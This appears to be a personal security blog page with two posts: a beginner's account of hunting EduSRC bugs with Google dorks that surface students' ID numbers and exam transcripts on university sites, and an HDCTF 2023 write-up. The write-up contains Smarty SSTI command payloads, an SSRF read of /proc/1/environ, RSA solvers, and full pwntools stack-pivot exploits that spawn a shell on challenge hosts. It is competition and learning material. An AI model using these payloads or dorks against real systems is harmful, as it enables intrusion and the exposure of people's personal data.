  <a class="article-title" href="/2023/05/05/edusrc%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/"
    >edusrc的第一次挖掘</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/05/05/edusrc%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/" class="article-date">
  <time datetime="2023-05-05T07:42:22.000Z" itemprop="datePublished">2023-05-05</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">漏洞挖掘</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="edusrc账号获得"><a href="#edusrc账号获得" class="headerlink" title="edusrc账号获得"></a>edusrc账号获得</h1><p>可以通过内部的邀请码然后注册账号，再或者就是非邀请码注册，但是需要你提交一个漏洞审核过之后就会给你发邮件账号密码都在邮件里，当然第一个漏洞审核的非常快，最迟第二天就审核完成了。</p>
<h1 id="挖掘的开始"><a href="#挖掘的开始" class="headerlink" title="挖掘的开始"></a>挖掘的开始</h1><p>在前段时间的下午第一次先尝试挖edusrc，然后浏览一下别人的挖掘思路，然后晚上就自己开始尝试了，当然也顺利拿到属于自己的edusrc账号。</p>
<h1 id="挖掘类型的确定"><a href="#挖掘类型的确定" class="headerlink" title="挖掘类型的确定"></a>挖掘类型的确定</h1><p>对于我这种菜鸡当然要从信息泄露挖起，首先就选择了挖身份信息泄露，首先通过谷歌语法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:edu.cn 身份证号</span><br></pre></td></tr></table></figure>

<p>当然现在这种漏洞已经很少了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">site:edu.cn 四六级成绩</span><br><span class="line">site:edu.cn 计算机等级考试成绩</span><br></pre></td></tr></table></figure>

<p>然后通过筛选就能下载成绩单的地方</p>
<p><img src="/2023/05/05/edusrc%E7%9A%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8C%96%E6%8E%98/image-20230505155609536.png" alt="image-20230505155609536"></p>
<p>然后通过这种链接下载成绩单</p>
<p>上面有的会直接有sfz号，基本都有证书编号，姓名，然后可以通过中国考试教育网查询信息，上面会含有身份信息。</p>
<p>晚上提交第二天早上就审核通过了，账号到手。</p>
<p>该网站漏洞已经被修复，不要在尝试挖该站点的漏洞</p>
<p>但是通过上述收集信息的方式已经被人打烂了，现在在用这种方式去挖基本上全是重复，所以可以尝试其他思路进行挖掘。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/edusrc/" rel="tag">edusrc</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-2023-HDCTF"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2023/04/22/2023-HDCTF/"
    >2023 HDCTF</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2023/04/22/2023-HDCTF/" class="article-date">
  <time datetime="2023-04-22T12:34:18.000Z" itemprop="datePublished">2023-04-22</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/match/">match</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Welcome-To-HDCTF-2023"><a href="#Welcome-To-HDCTF-2023" class="headerlink" title="Welcome To HDCTF 2023"></a>Welcome To HDCTF 2023</h2><p>随便点点就弹出flag了</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422130844824.png" alt="image-20230422130844824"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;We13ome_t@_HDCTF_2o23&#125;</span><br></pre></td></tr></table></figure>

<h2 id="SearchMaster"><a href="#SearchMaster" class="headerlink" title="SearchMaster"></a>SearchMaster</h2><p>首先扫描目录</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422131014866.png" alt="image-20230422131014866"></p>
<p>访问</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422131048842.png" alt="image-20230422131048842"></p>
<p>应该是smarty  ssti在根据题目提示用post传data</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;if system(&#x27;ls /&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/22/2023-HDCTF/image-20230422131231234.png" alt="image-20230422131231234"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;if system(&#x27;cat /flag_13_searchmaster&#x27;)&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/22/2023-HDCTF/image-20230422131304639.png" alt="image-20230422131304639"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;204f2649-fb8f-4bd5-bd14-3940f2d5b780&#125;</span><br></pre></td></tr></table></figure>

<h2 id="YamiYami"><a href="#YamiYami" class="headerlink" title="YamiYami"></a>YamiYami</h2><p>根据题目提示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">I wanna eat some yummy food :(</span><br><span class="line">can you give me some?</span><br></pre></td></tr></table></figure>

<p>应该是先看看cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.ZENVMw.8YLXYcxD4iC4qGOrbXC2SdlHJiE</span><br><span class="line">&#123;&quot;passport&quot;:&quot;YamiYami&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>这解码之后也没用呀</p>
<p>然后就去看了文件上传的地方发现.php文件都可以上传，但是没有给文件路径还是不好搞</p>
<p>又去看了看pwd 发现页面有个  &#x2F;app联想到ssti</p>
<p>无论怎么我去注入但是不成功</p>
<p>所以这应该是先上传文件然后，在去ssti，尝试了无数次方法就是出不来</p>
<p>然后去做了一个签到re</p>
<p>回来发现一直忽略了Read something  这是个url跳转</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/read?url=https://baidu.com</span><br></pre></td></tr></table></figure>

<p>刚开始就直接把他忽略，但是再次看发现read,就想着能不能读取文件，试了伪协议不行，又卡了然后就看到一篇文章可以读取环境变量，就尝试了一下结果真出了</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422133632643.png" alt="image-20230422133632643"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/read?url=file:///proc/1/environ</span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/22/2023-HDCTF/image-20230422133535890.png" alt="image-20230422133535890"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;449ff62b-d28a-4fd0-9e20-fe20e292df51&#125;</span><br></pre></td></tr></table></figure>











<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Normal-Rsa"><a href="#Normal-Rsa" class="headerlink" title="Normal_Rsa"></a>Normal_Rsa</h2><p>flag直接在题目代码里  一血</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422131417557.png" alt="image-20230422131417557"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDCTF&#123;0b3663ed-67e4-44e2-aee7-7c2d8665b63c&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Normal-Rsa-revenge"><a href="#Normal-Rsa-revenge" class="headerlink" title="Normal_Rsa(revenge)"></a>Normal_Rsa(revenge)</h2><p>因为p是256位，q,r是512位</p>
<p>所以直接对P,Q开方就得到p,q  (一血)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">12260605124589736699896772236316146708681543140877060257859757789407603137409427771651536724218984023652680193208019939451539427781667333168267801603484921516526297136507792965087544395912271944257535087877112172195116066600141520444466165090654943192437314974202605817650874838887065260835145310202223862370942385079960284761150198033810408432423049423155161537072427702512211122538749</span></span><br><span class="line">c = <span class="number">7072137651389218220368861685871400051412849006784353415843217734634414633151439071501997728907026771187082554241548140511778339825678295970901188560688120351732774013575439738988314665372544333857252548895896968938603508567509519521067106462947341820462381584577074292318137318996958312889307024181925808817792124688476198837079551204388055776209441429996815747449815546163371300963785</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=<span class="number">93595995503882796484948942664787567679411018850571035558047095185699253142469</span></span><br><span class="line">q=<span class="number">10626484086425759109526601843431131274302413270645909659804218687679714714707826956012068057535486307660248767234433303462363381171495481245390248120740549</span></span><br><span class="line">r=n//p//q</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># HDCTF&#123;08c66aa2-f8ea-49a2-a84f-ab9c7999ebb2&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="爬过小山去看云"><a href="#爬过小山去看云" class="headerlink" title="爬过小山去看云"></a>爬过小山去看云</h2><p>三血</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">密文：ymyvzjtxswwktetpyvpfmvcdgywktetpyvpfuedfnzdjsiujvpwktetpyvnzdjpfkjssvacdgywktetpyvnzdjqtincduedfpfkjssne</span><br><span class="line">在山的那头，有3个人，4只鸟，19只羊，11朵云</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>很明显的希尔（hill）密码</p>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yourpiniseightfourtwozeroeightfourtwoonezeroeighteightfourzerotwofourzeroeightfourzeroonezeroonetwofourx</span><br></pre></td></tr></table></figure>

<p>读其中的内容得</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">842084210884024084010124</span><br></pre></td></tr></table></figure>

<p>又是很明显的云影密码</p>
<p>由于很短直接手撸</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">842 8421 884 24 84 1 124</span><br><span class="line">14 15 20 6 12 1 7</span><br><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">NOTFLAG</span><br><span class="line">NSSCTF&#123;NOTFLAG&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Math-Rsa"><a href="#Math-Rsa" class="headerlink" title="Math_Rsa"></a>Math_Rsa</h2><p>简单构造一个多项式环就OK了</p>
<p>a&#x3D;pow(p,2,r)</p>
<p>$ a \equiv p^2 mod r$</p>
<p>a，r已知求p,构造多项式环</p>
<p>$f&#x3D;p^2-a$</p>
<p>求出来p之后就是普通的RSA了</p>
<p>sage脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">14859096721972571275113983218934367817755893152876205380485481243331724183921836088288081702352994668073737901001999266644597320501510110156000004121260529706467596723314403262665291609405901413014268847623323618322794733633701355018297180967414569196496398340411723555826597629318524966741762029358820546567319749619243298957600716201084388836601266780686983787343862081546627427588380349419143512429889606408316907950943872684371787773262968532322073585449855893701828146080616188277162144464353498105939650706920663343245426376506714689749161228876988380824497513873436735960950355105802057279581583149036118078489</span></span><br><span class="line">r = <span class="number">145491538843334216714386412684012043545621410855800637571278502175614814648745218194962227539529331856802087217944496965842507972546292280972112841086902373612910345469921148426463042254195665018427080500677258981687116985855921771781242636077989465778056018747012467840003841693555272437071000936268768887299</span></span><br><span class="line">a = <span class="number">55964525692779548127584763434439890529728374088765597880759713360575037841170692647451851107865577004136603179246290669488558901413896713187831298964947047118465139235438896930729550228171700578741565927677764309135314910544565108363708736408337172674125506890098872891915897539306377840936658277631020650625</span></span><br><span class="line">c = <span class="number">12162333845365222333317364738458290101496436746496440837075952494841057738832092422679700884737328562151621948812616422038905426346860411550178061478808128855882459082137077477841624706988356642870940724988156263550796637806555269282505420720558849717265491643392140727605508756229066139493821648882251876933345101043468528015921111395602873356915520599085461538265894970248065772191748271175288506787110428723281590819815819036931155215189564342305674107662339977581410206210870725691314524812137801739246685784657364132180368529788767503223017329025740936590291109954677092128550252945936759891497673970553062223608</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">P.&lt;p&gt; = PolynomialRing(Zmod(r))</span><br><span class="line">f=p^<span class="number">2</span>-a</span><br><span class="line">f=f.monic()</span><br><span class="line">p=<span class="built_in">int</span>(f.roots()[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">q=n//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(phi)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDCTF&#123;0ce04f81-516b-4132-81a2-b0b7166e03ad&#125;</span><br></pre></td></tr></table></figure>



<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="easy-re"><a href="#easy-re" class="headerlink" title="easy_re"></a>easy_re</h2><p>首先进行脱壳处理</p>
<p>然后扔进IDA</p>
<p>发现base64</p>
<p><img src="/2023/04/22/2023-HDCTF/image-20230422101827552.png" alt="image-20230422101827552"></p>
<p>解码即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDCTF&#123;Y0u_h@v2_/\/\@57er3d_7he_r3v3rs3&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Keep-on"><a href="#Keep-on" class="headerlink" title="Keep_on:"></a>Keep_on:</h2><p>简单的栈栈迁移问题,直接套我深藏已久的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">native = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> native:</span><br><span class="line">    p = process(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28720</span>)</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data: p.send(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">rc = <span class="keyword">lambda</span> numb=<span class="number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> delims: p.recvuntil(delims)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh = <span class="number">0x400911</span></span><br><span class="line">leave_ret = <span class="number">0x4007f2</span></span><br><span class="line">pop_rdi = <span class="number">0x4008d3</span></span><br><span class="line">ret = <span class="number">0x4005b9</span></span><br><span class="line">sla(<span class="string">&quot;name:&quot;</span>,<span class="string">b&#x27;%16$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">&quot;hello,&quot;</span>)</span><br><span class="line">rbp_addr = <span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(),<span class="number">16</span>) -<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;rbp--&gt;&quot;</span>+<span class="built_in">hex</span>(rbp_addr))</span><br><span class="line">s_input = rbp_addr - <span class="number">0x50</span></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + flat([ret,pop_rdi,s_input,system])</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(s_input) + p64(leave_ret)</span><br><span class="line">sea(<span class="string">&quot;keep on !\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="minions"><a href="#minions" class="headerlink" title="minions:"></a>minions:</h2><p>也是一道栈迁移，跟刚刚keep_on差不多，只是多了一点计算，话不多说还直接拿出我珍藏的大脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">native = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> native:</span><br><span class="line">    p = process(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>,<span class="number">28576</span>)</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data: p.send(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">rc = <span class="keyword">lambda</span> numb=<span class="number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> delims: p.recvuntil(delims)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">se = <span class="keyword">lambda</span> data: p.send(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line">sea = <span class="keyword">lambda</span> delim, data: p.sendafter(delim, data)</span><br><span class="line">rc = <span class="keyword">lambda</span> numb=<span class="number">4096</span>: p.recv(numb)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> delims: p.recvuntil(delims)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn1&#x27;</span>)</span><br><span class="line">key = <span class="number">0x6010a0</span></span><br><span class="line">payload = <span class="string">b&#x27;%28$p&#x27;</span>+ <span class="string">b&#x27;%88c%8$hhna&#x27;</span>+ p64(key)</span><br><span class="line">sea(<span class="string">&quot;name?\n\n&quot;</span>,payload)</span><br><span class="line">hdf = <span class="number">0x6010c0</span></span><br><span class="line">pop_rdi = <span class="number">0x400893</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ru(<span class="string">&quot;Hello,&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(p.recv(<span class="number">14</span>).decode(),<span class="number">16</span>) + <span class="number">0x40</span></span><br><span class="line">success(<span class="string">&quot;stack--&gt;&quot;</span> + <span class="built_in">hex</span>(stack))</span><br><span class="line">s_input = stack - <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400581</span></span><br><span class="line">leave_ret = <span class="number">0x400758</span></span><br><span class="line">payload = flat([<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,ret,pop_rdi,s_input,system])</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(s_input) + p64(leave_ret)</span><br><span class="line">sea(<span class="string">&quot;you&quot;</span>,payload)</span><br><span class="line">sea(<span class="string">&quot;Minions&quot;</span>,<span class="string">b&#x27;pwn!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="hardMisc"><a href="#hardMisc" class="headerlink" title="hardMisc"></a>hardMisc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$zsteg emoji.png</span><br><span class="line">[?] 40 bytes of extra data after image end (IEND), offset = 0x8a697</span><br><span class="line">extradata:0         .. text: &quot;SERDVEZ7d0UxYzB3M18xMF9IRGN0Zl9NMTVjfQ==&quot;</span><br></pre></td></tr></table></figure>

<p>base64解码即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HDCTF&#123;wE1c0w3_10_HDctf_M15c&#125;</span><br></pre></td></tr></table></figure>

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/2023HDCTF/" rel="tag">2023HDCTF</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
  </article>
  

  
  <nav class="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2023
        <i class="ri-heart-fill heart_icon"></i> f14g
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/favicon.ico" alt="f14g"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/me">关于我</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/friends">友链</a>
    </li>
    
